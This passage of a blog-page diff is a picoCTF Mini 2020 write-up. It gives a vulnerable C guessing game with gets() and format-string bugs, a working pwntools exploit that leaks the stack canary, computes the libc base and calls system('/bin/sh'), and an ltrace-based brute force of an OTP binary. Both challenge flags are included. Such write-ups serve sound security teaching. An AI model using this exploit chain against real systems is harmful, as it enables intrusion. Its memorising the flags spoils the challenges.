+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;What number would you like to guess?</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> guess[BUFSIZE]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">fgets</span><span>(guess</span><span style="color:#ccc9c2cc;">,</span><span> BUFSIZE</span><span style="color:#ccc9c2cc;">,</span><span> stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>	
+</span><span>	</span><span style="color:#ffa759;">long</span><span> g </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">atol</span><span>(guess)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f29e74;">!</span><span>g) {
+</span><span>		</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;That&#39;s not a valid number!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	} </span><span style="color:#ffa759;">else </span><span>{
+</span><span>		</span><span style="color:#ffa759;">if </span><span>(g </span><span style="color:#f29e74;">==</span><span> ans) {
+</span><span>			</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Congrats! You win! Your prize is this print statement!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>			res </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>		} </span><span style="color:#ffa759;">else </span><span>{
+</span><span>			</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Nope!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>	}
+</span><span>	</span><span style="color:#ffa759;">return</span><span> res</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">win</span><span>() {
+</span><span>	</span><span style="color:#ffa759;">char</span><span> winner[BUFSIZE]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;New winner!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Name? &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">gets</span><span>(winner)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Congrats: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(winner)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span>
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">int </span><span style="color:#ffcc66;">argc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">**</span><span style="color:#ffcc66;">argv</span><span>){
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">,</span><span> _IONBF</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="font-style:italic;color:#5c6773;">// Set the gid to the effective gid
+</span><span>	</span><span style="font-style:italic;color:#5c6773;">// this prevents /bin/sh from dropping the privileges
+</span><span>	</span><span style="font-style:italic;color:#5ccfe6;">gid_t</span><span> gid </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">getegid</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">setresgid</span><span>(gid</span><span style="color:#ccc9c2cc;">,</span><span> gid</span><span style="color:#ccc9c2cc;">,</span><span> gid)</span><span style="color:#ccc9c2cc;">;
+</span><span>	
+</span><span>	</span><span style="color:#ffa759;">int</span><span> res</span><span style="color:#ccc9c2cc;">;
+</span><span>	
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Welcome to my guessing game!</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Version: </span><span style="color:#ffcc66;">%x</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">get_version</span><span>())</span><span style="color:#ccc9c2cc;">;
+</span><span>	
+</span><span>	</span><span style="color:#ffa759;">while </span><span>(</span><span style="color:#ffcc66;">1</span><span>) {
+</span><span>		res </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">do_stuff</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">if </span><span>(res) {
+</span><span>			</span><span style="color:#ffd580;">win</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>	}
+</span><span>	
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>This version of guessing_game is pretty similar to the previous.  It isn't static this time, and get_random() returns the address of rand instead of an actual random number, but other than that the binary is pretty similar.  Since it isn't static we can't do the same attack as last time, but the dynamic linking opens up other avenues of attack.  Also, the vulnerable function now has a string formatting vulnerability as well.  In this case we'll be performing a <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a> attack to get a shell.</p>
+<p>First step is to figure out what number we need to guess to get into the vulnerability function.  I wrote a python script to try everything and figure it out for me.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">from </span><span>ctypes </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span style="color:#ffa759;">import </span><span>json
+</span><span style="color:#ffa759;">import </span><span>sys
+</span><span>
+</span><span>tasks </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">4096
+</span><span>
+</span><span>checked </span><span style="color:#f29e74;">= </span><span>{}
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">check</span><span>(</span><span style="color:#ffcc66;">i</span><span>):
+</span><span>	</span><span style="color:#ffa759;">if </span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i) </span><span style="color:#f29e74;">in </span><span>checked:
+</span><span>		</span><span style="color:#ffa759;">return </span><span>checked[</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i)]
+</span><span>	p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;jupiter.challenges.picoctf.org&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">28953</span><span>)
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;-&quot; </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i))
+</span><span>	resp </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">close</span><span>()
+</span><span>	checked[i] </span><span style="color:#f29e74;">= </span><span>(i</span><span style="color:#ccc9c2cc;">, </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;Congrats!&quot;</span><span style="color:#ccc9c2cc;">, </span><span>resp ) </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">None</span><span>)
+</span><span>	</span><span style="color:#ffa759;">return </span><span>(i</span><span style="color:#ccc9c2cc;">, </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;Congrats!&quot;</span><span style="color:#ccc9c2cc;">, </span><span>resp ) </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">None</span><span>)
+</span><span>
+</span><span style="color:#ffa759;">try</span><span>:
+</span><span>	</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(tasks):
+</span><span>		</span><span style="color:#ffa759;">if </span><span>i </span><span style="color:#f29e74;">% </span><span style="color:#ffcc66;">32 </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>:
+</span><span>			</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;trying num = &quot;</span><span style="color:#ccc9c2cc;">, </span><span>i)
+</span><span>		c </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">check</span><span>(i)
+</span><span>		</span><span style="color:#ffa759;">if </span><span>c[</span><span style="color:#ffcc66;">1</span><span>] </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">True</span><span>:
+</span><span>			</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;found!&quot;</span><span style="color:#ccc9c2cc;">, </span><span>c)
+</span><span>			</span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;checked.json&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;w&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(checked))
+</span><span>			sys</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">exit</span><span>()
+</span><span style="color:#ffa759;">except </span><span>(</span><span style="font-style:italic;color:#5ccfe6;">KeyboardInterrupt</span><span style="color:#ccc9c2cc;">, </span><span style="font-style:italic;color:#5ccfe6;">SystemExit</span><span>):
+</span><span>	</span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;checked.json&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;w&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(checked))
+</span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;checked.json&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;w&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">write</span><span>(json</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">dumps</span><span>(checked))
+</span></code></pre>
+<p>I leaked the canary with the string formatting vuln.  The stack is constant sized so I just searched for the canary in GDB and then counted the distance I needed to read with the string formatting attack.  The canary is constant between program executions so once I have the canary I can just ROP back into the vulnerable function and then do my ret2libc exploit.</p>
+<p>In theory you could leak the libc version based on the location of a symbol using something like <a href="https://libc.blukat.me/">libc database search</a> but you could also just guess and be lucky.  Libc 2.27 is the version of libc used on Ubuntu 18.04 and thus very frequently the libc version used on CTF servers.  Once you know the offset of some function in libc you can subtract the offset of that function (I used rand) in the libc version on the server to get the address of the base of the libc.  Once you have the base of libc you can determine the address of any function inside libc by adding the offset of that function to your calculate base.  Once you can do this there is nothing stopping you from calling system("/bin/sh") and getting a shell.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&quot;termite&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;-e&quot;</span><span>]
+</span><span>
+</span><span>elf </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;./vuln&quot;</span><span>)
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># p = elf.debug()
+</span><span style="font-style:italic;color:#5c6773;"># p = elf.process()
+</span><span>p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;jupiter.challenges.picoctf.org&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">15815</span><span>)
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;guess?&quot;</span><span>)
+</span><span>
+</span><span>NUMBER </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;-31&quot;
+</span><span>
+</span><span>
+</span><span>WIN_EIP_OFFSET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">720
+</span><span>
+</span><span>WIN_CANARY_OFFSET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">320
+</span><span>
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">leak_canary</span><span>():
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(NUMBER)
+</span><span>
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;Name?&quot;</span><span>)
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;%135$x&quot;</span><span>)
+</span><span>	resp </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;guess?&quot;</span><span>)
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;Congrats: ([0-9a-fA-F]</span><span style="color:#ffcc66;">{8}</span><span style="color:#bae67e;">)&quot;</span><span style="color:#ccc9c2cc;">, </span><span>resp)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span>
+</span><span>canary </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_canary</span><span>()
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">send_rop</span><span>(</span><span style="color:#ffcc66;">rop</span><span>):
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;Name?&quot;</span><span>)
+</span><span>	payload </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">512 </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p32</span><span>(canary) </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">12 </span><span style="color:#f29e74;">+ </span><span>rop
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(payload)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">leak_symbol</span><span>(</span><span style="color:#ffcc66;">sym</span><span>):
+</span><span>	rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(elf)
+</span><span>	rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">puts</span><span>(elf</span><span style="color:#f29e74;">.</span><span>symbols[sym])
+</span><span>	rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">win</span><span>()
+</span><span>	</span><span style="color:#ffd580;">send_rop</span><span>(rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>())
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>	res </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>	p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">u32</span><span>(res[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">4</span><span>])
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(NUMBER)
+</span><span>rand_sym </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">leak_symbol</span><span>(</span><span style="color:#bae67e;">&#39;rand&#39;</span><span>)
+</span><span>
+</span><span>
+</span><span style="font-style:italic;color:#5c6773;"># libc 2.32
+</span><span style="font-style:italic;color:#5c6773;"># RAND_OFFSET = 0x39170
+</span><span style="font-style:italic;color:#5c6773;"># SYSTEM_OFFSET = 0x456e0
+</span><span style="font-style:italic;color:#5c6773;"># STR_BIN_SH_OFFSET = 0x195108
+</span><span style="font-style:italic;color:#5c6773;">#libc 2.27
+</span><span>RAND_OFFSET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x30fe0
+</span><span>SYSTEM_OFFSET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x3cd80
+</span><span>STR_BIN_SH_OFFSET </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0x17bb8f
+</span><span>libc_base </span><span style="color:#f29e74;">= </span><span>rand_sym </span><span style="color:#f29e74;">- </span><span>RAND_OFFSET
+</span><span>system </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span>SYSTEM_OFFSET
+</span><span>binsh </span><span style="color:#f29e74;">= </span><span>libc_base </span><span style="color:#f29e74;">+ </span><span>STR_BIN_SH_OFFSET
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;rand:&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">hex</span><span>(rand_sym))
+</span><span>rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(elf)
+</span><span>rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">call</span><span>(system</span><span style="color:#ccc9c2cc;">, </span><span>[binsh])
+</span><span style="color:#ffd580;">send_rop</span><span>(rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">chain</span><span>())
+</span><span>
+</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;cat flag.txt;exit;&quot;</span><span>)
+</span><span style="color:#f28779;">print</span><span>(re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;(picoCTF{.*?})&quot;</span><span style="color:#ccc9c2cc;">,</span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>))
+</span></code></pre>
+<p>flag:</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>picoCTF{p0p_r0p_4nd_dr0p_1t_506b81e98597929e}
+</span></code></pre>
+<h1 id="otp-implementation">OTP Implementation</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Yay reversing! Relevant files: otp flag.txt
+</span></code></pre>
+<p><a href="/ctf/picoctf-mini-2020/otp/otp">otp</a></p>
+<p><img src="/ctf/picoctf-mini-2020/otp/main1.png" alt="main function" />
+<img src="/ctf/picoctf-mini-2020/otp/valid_char.png" alt="valid_char function, returns true if it is a valid char in a hex string" /></p>
+<p>So to summarize:</p>
+<ol>
+<li>It copies 100 chars from the first argument</li>
+<li>It does gross stuff that I don't care to reverse</li>
+<li>If a char isn't a valid hex string it'll fail.</li>
+<li>If it doesn't process 100 characters it'll fail.</li>
+</ol>
+<p>In an attempt to avoid manually reversing the code I took a look at it using ltrace.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ ltrace ./otp aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span><span>strncpy(0x7ffc8cd5be70, &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;..., 100)                                                                                  = 0x7ffc8cd5be70
+</span><span>strncmp(&quot;fkpejodinchmbglafkpejodinchmbgla&quot;..., &quot;mlaebfkoibhoijfidblechbggcgldice&quot;..., 100)                                                           = -7
+</span><span>puts(&quot;Invalid key!&quot;Invalid key!
+</span><span>)                                                                                                                                 = 13
+</span><span>+++ exited (status 1) +++
+</span><span>❯ ltrace ./otp baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span><span>strncpy(0x7ffc13641a60, &quot;baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;..., 100)                                                                                  = 0x7ffc13641a60
+</span><span>strncmp(&quot;hmbglafkpejodinchmbglafkpejodinc&quot;..., &quot;mlaebfkoibhoijfidblechbggcgldice&quot;..., 100)                                                           = -5
+</span><span>puts(&quot;Invalid key!&quot;Invalid key!
+</span><span>)                                                                                                                                 = 13
+</span><span>+++ exited (status 1) +++
+</span><span>❯ ltrace ./otp abaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+</span><span>strncpy(0x7ffe053233b0, &quot;abaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;..., 100)                                                                                  = 0x7ffe053233b0
+</span><span>strncmp(&quot;fmbglafkpejodinchmbglafkpejodinc&quot;..., &quot;mlaebfkoibhoijfidblechbggcgldice&quot;..., 100)                                                           = -7
+</span><span>puts(&quot;Invalid key!&quot;Invalid key!
+</span><span>)                                                                                                                                 = 13
+</span><span>+++ exited (status 1) +++
+</span></code></pre>
+<p>The key thing to note here is that a character affects itself and any character after it.  This means that we can brute force the correct code in linear time by trying a character until we know its correct and then moving on to the next one.  This is implemented using python below.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>subprocess </span><span style="color:#ffa759;">import </span><span>Popen</span><span style="color:#ccc9c2cc;">, </span><span>PIPE</span><span style="color:#ccc9c2cc;">, </span><span>STDOUT
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span style="color:#ffa759;">from </span><span>binascii </span><span style="color:#ffa759;">import </span><span>unhexlify
+</span><span>flag </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;1fcb81cd1f6f1e12b429092e3647153b6c212772554ca004145b82367e1e6b7870827dc249a319601776f727434e6b6227d1&quot;
+</span><span>target </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;mlaebfkoibhoijfidblechbggcgldicegjbkcmolhdjihgmmieabohpdhjnciacbjjcnpcfaopigkpdfnoaknjlnlaohboimombk&quot;
+</span><span>
+</span><span>key </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">list</span><span>(</span><span style="color:#bae67e;">&quot;0&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">100</span><span>)
+</span><span>
+</span><span>strncmp_regex </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">compile</span><span>(</span><span style="color:#bae67e;">&quot;strncmp</span><span style="background-color:#ffa759;color:#ffffff;">\(</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">(.*?)</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">.*</span><span style="background-color:#ffa759;color:#ffffff;">\)</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">xors</span><span>(</span><span style="color:#ffcc66;">a</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">b</span><span>):
+</span><span>	</span><span style="color:#ffa759;">return </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>([</span><span style="color:#f28779;">chr</span><span>(x </span><span style="color:#f29e74;">^ </span><span>y) </span><span style="color:#ffa759;">for </span><span>x</span><span style="color:#ccc9c2cc;">,</span><span>y </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">zip</span><span>(a</span><span style="color:#ccc9c2cc;">,</span><span>b)])
+</span><span>
+</span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">100</span><span>):
+</span><span>	</span><span style="color:#ffa759;">for </span><span>j </span><span style="color:#ffa759;">in </span><span style="color:#bae67e;">&quot;0123456789abcdef&quot;</span><span>:
+</span><span>		key[i] </span><span style="color:#f29e74;">= </span><span>j
+</span><span>		p </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Popen</span><span>([</span><span style="color:#bae67e;">&quot;ltrace&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;-s&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;1000&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&quot;./otp&quot; </span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(key)]</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">stdout</span><span style="color:#f29e74;">=</span><span>PIPE</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">stderr</span><span style="color:#f29e74;">=</span><span>STDOUT)
+</span><span>		response </span><span style="color:#f29e74;">= </span><span>p</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">communicate</span><span>()[</span><span style="color:#ffcc66;">0</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>		match </span><span style="color:#f29e74;">= </span><span>strncmp_regex</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(response)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>)[</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">100</span><span>]
+</span><span>		</span><span style="color:#ffa759;">if </span><span>match[i] </span><span style="color:#f29e74;">== </span><span>target[i]:
+</span><span>			</span><span style="color:#f28779;">print</span><span>(match)
+</span><span>			</span><span style="color:#ffa759;">break
+</span><span>		</span><span style="font-style:italic;color:#5c6773;"># print()
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;key:&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(key))
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#bae67e;">&quot;flag:&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">xors</span><span>(</span><span style="color:#ffd580;">unhexlify</span><span>(</span><span style="color:#bae67e;">&#39;&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(key))</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffd580;">unhexlify</span><span>(flag)))
+</span></code></pre>
+<p>flag:</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>picoCTF{cust0m_jumbl3s_4r3nt_4_g0Od_1d3A_ca692500}
+</span></code></pre>
+
+    </div>
+
+    
+    <div class="article-info">
+        
